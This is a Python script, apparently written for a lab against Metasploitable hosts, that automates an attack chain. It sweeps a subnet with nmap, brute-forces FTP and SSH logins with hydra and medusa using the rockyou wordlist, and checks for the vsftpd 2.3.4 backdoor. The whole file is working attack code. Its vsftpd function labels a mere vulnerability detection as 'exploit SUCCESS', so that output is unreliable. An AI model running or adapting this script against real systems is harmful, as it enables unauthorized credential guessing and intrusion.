import re
import subprocess as sub

# FILTER THIS IP ITS THE OWNER (myself)
# 192.168.10.1


def get_active_ips() -> list[str]:
    """
    Get active IPs in the network
    :return: list of active IPs
    """

    # command = ["docker", "exec", "kali-attacker", "bash", "-c"
    #     , "nmap  -sn 192.168.10.0/24 --exclude 192.168.10.1,192.168.10.10 | grep 'Nmap scan report' | awk '{print $6}'"
    #    ]
    command = "nmap -sn 192.168.10.0/24 --exclude 192.168.10.1,192.168.10.10 | grep 'Nmap scan report' | awk '{print $6}'"


    # Run the command
    ip_scan = sub.run(command,
        shell = True,
        capture_output = True,
        text=True
      )

    # get ips
    ips = ip_scan.stdout.split("\n")

    # remove parentheses & empty lines
    ips = [re.sub(r"[()]", "", ip) for ip in ips if ip]

    return ips

def get_active_ports(ip: str) -> list[str]:
    """
    Get active ports in the network
    :param ip: IP address to scan
    :return: list of active ports
    """

    # command = ["docker", "exec", "kali-attacker", "bash", "-c"
    #     , f"nmap -sV -p 21,22,2121 {ip} | grep '^PORT' -A 100 | grep open | awk '{{print $1}}' | cut -d'/' -f1"
    #    ]
    command = f"nmap -sV -p 21,22,2121 {ip} | grep '^PORT' -A 100 | grep open | awk '{{print $1}}' | cut -d'/' -f1"

    # Run the command
    port_scan = sub.run(command,
        shell = True,
        capture_output = True,
        text = True
      )

    # get ports
    ports = port_scan.stdout.split("\n")

    # remove empty lines
    ports = [port for port in ports if port]

    return ports


def attack_ftp(ip: str) -> bool:
    """
    Bruteforce FTP server.
    Return True if successful, else False.
    """
    command = f"hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://{ip}"
    proc = sub.run(command, shell=True, capture_output=True, text=True)
    result = proc.stdout

    if "login:" in result:
        print(f"[+] FTP attack SUCCESS on {ip}")
        return True
    else:
        print(f"[-] FTP attack FAILED on {ip}")
        return False

def attack_ssh(ip: str) -> bool:
    """
    Bruteforce SSH server.
    Return True if successful, else False.
    """
    command = f"medusa -h {ip} -P /usr/share/wordlists/rockyou.txt -u msfadmin -M ssh -f -t 4"
    proc = sub.run(command, shell=True, capture_output=True, text=True)
    result = proc.stdout

    if "SUCCESS" in result:
        print(f"[+] SSH attack SUCCESS on {ip}")
        return True
    else:
        print(f"[-] SSH attack FAILED on {ip}")
        return False

def attack_vsftpd(ip: str) -> bool:
    """
    Exploit VSFTPD 2.3.4 backdoor.
    Return True if successful, else False.
    """
    # Create a command that runs a minimal Metasploit session non-interactively
    command = f"nmap -O -p 21 --script ftp-vsftpd-backdoor {ip}| grep VULNERABLE"
    proc = sub.run(command, shell=True, capture_output=True, text=True)
    result = proc.stdout

    if "VULNERABLE" in result:
        print(f"[+] VSFTPD exploit SUCCESS on {ip}")
        return True
    else:
        print(f"[-] VSFTPD exploit FAILED on {ip}")
        return False